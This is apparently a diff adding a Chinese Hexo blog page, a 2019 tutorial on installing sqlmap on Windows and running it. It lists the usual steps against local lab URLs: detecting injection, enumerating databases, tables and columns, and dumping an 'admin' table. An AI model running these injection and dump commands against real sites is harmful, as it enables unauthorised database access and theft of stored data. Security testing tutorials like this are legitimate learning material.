@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <meta name="keywords" content="hexo, autumn">
+    <title>
+        
+    </title>
+    <!-- favicon -->
+    
+    <link rel="icon" href="/img/smile.ico">
+    
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- highlight -->
+    <link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.12.0/styles/github-gist.min.css">
+    <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+    <script>
+        hljs.initHighlightingOnLoad()
+    </script>
+    <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/frontendsophie/hexo-infinite-scroll@1.0.0/dist/hexo-infinite-scroll.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/frontendsophie/hexo-infinite-scroll@1.0.0/dist/hexo-infinite-scroll.min.js"></script>
+    <script>
+        infiniteScroll()
+
+        // for mobile menu
+        $(function () {
+            $('.social-button').click(function () {
+                if ($('.social-links').hasClass('hide-links')) {
+                    $('.social-links').removeClass('hide-links')
+                } else {
+                    $('.social-links').addClass('hide-links')
+                }
+            })
+        })
+    </script>
+</head>
+
+    <body style="background: url(https://cdn.jsdelivr.net/gh/frontendsophie/hexo-theme-autumn@1.0.0/source/img/button-bg.png) #f3f3f3">
+        <div class="container">
+            <header class="header">
+    <h1 class="title">
+        <a href="/" class="logo">
+            
+        </a>
+    </h1>
+    <h2 class="desc">
+        
+    </h2>
+
+    <nav class="links">
+        <button class="social-button">
+            menu
+        </button>
+        <ul class="social-links hide-links">
+            
+                <li>
+                    <a href="https://github.com/realeather">
+                        Github
+                    </a>
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+                <main class="main">
+                    <article class="post">
+    
+            <h2 class="post-title">
+                安装使用sqlmap
+            </h2>
+            <ul class="post-date">
+                <li>
+                    2019-03-22
+                </li>
+                <li>
+                    
+                </li>
+            </ul>
+            <div class="post-content">
+                <p>Sqlmap是一款开源自动化SQL注入工具<br>github搜索sqlmap=&gt;releases=&gt;windows操作系统下载zip文件解压,将sqlmap目录添加到系统变量Path<br><img src="/image/安装使用sqlmap/github-releases.png" alt=""></p>
+<p><img src="/image/安装使用sqlmap/sqlmap-zip.png" alt=""></p>
+<p>由于sqlmap用python编写,需要python环境,<code>python -V</code>查看版本是2.7.11<br><img src="/image/安装使用sqlmap/python-v.png" alt=""><br>这里介绍下PATHEXT环境变量的功能:在CMD窗口运行某个程序时,可以不输入程序的后缀名直接运行。<br>PATHEXT系统变量默认声明有<code>.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;</code><br>可以加上<code>.py;</code><br>添加变量前,输入sqlmap运行报错,输入sqlmap.py正常运行<br><img src="/image/安装使用sqlmap/pathext1.png" alt=""><br>添加变量后,直接输入sqlmap可以运行<br><img src="/image/安装使用sqlmap/pathext2.png" alt=""></p>
+<p><code>sqlmap --url http://192.168.11.86/index.php?id=1</code><br>给sqlmap一个url的时候它会:<br> 1.检测网站是否能够访问<br> 2.检测是否有waf<br> 3.判断可注入的参数<br> 4.判断可以用哪种sql注入技术来注入<br> 5.识别出哪种数据库<br> 6.根据用户输入的参数进行操作<br> <img src="/image/安装使用sqlmap/url.jpg" alt=""></p>
+<p>运行完显示payload,服务器版本信息<br><img src="/image/安装使用sqlmap/payload.jpg" alt=""></p>
+<p>sqlmap的输出结果默认保存在C:/Users/用户名//.sqlmap/output/下,测试前后需要删除网站缓存以免影响效果</p>
+<p><img src="/image/安装使用sqlmap/output.png" alt=""></p>
+<p>如果想观察sqlmap对一个点进行怎样的尝试判断以及读取数据,可以使用-v参数,共有7个等级,默认为1:<br> 0 只显示python错误以及严重的信息<br> 1 同时显示基本信息和警告信息(默认)<br> 2 同时显示debug信息<br> 3 同时显示注入的payload<br> 4 同时显示http请求<br> 5 同时显示http响应头<br> 6 同时显示http响应页面</p>
+<p>linux使用-v参数测试<br><img src="/image/安装使用sqlmap/-v.png" alt=""></p>
+<p><strong><em>sqlmap常规步骤</em></strong><br> 判断是否有注入<br> <code>sqlmap -u &quot;http://127.0.0.1/test.php?id=1&quot;</code><br> 查看所有数据库<br> <code>sqlmap -u &quot;http://127.0.0.1/test.php?id=1&quot; --dbs</code><br> 查看当前使用的数据库<br> <code>sqlmap -u &quot;http://127.0.0.1/test.php?id=1&quot; --current-db</code><br> 查看数据表<br> <code>sqlmap -u &quot;http://127.0.0.1/test.php?id=1&quot; -D sqliniect --tables</code><br> 查看列名<br> <code>sqlmap -u &quot;http://127.0.0.1/test.php?id=1&quot; -D sqliniect -T admin --columns</code><br> 查看数据<br> <code>sqlmap -u &quot;http://127.0.0.1/test.php?id=1&quot; -D sqliniect -T admin --dump</code></p>
+
+            </div>
+</article>
+
+                </main>
+                <aside class="aside">
+                    <section class="aside-section">
+                        
+    <h1>Categories</h1>
+
+    
+
+                    </section>
+                    <section class="aside-section">
+                        
+    <h1>Archives</h1>
+
+    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a></li></ul>
+
+
+                    </section>
+                    <section class="aside-section tag">
+                        
+    <h1>Tags</h1>
+
+    
+
+                    </section>
+                </aside>
+        </div>
+    </body>
+
+</html>
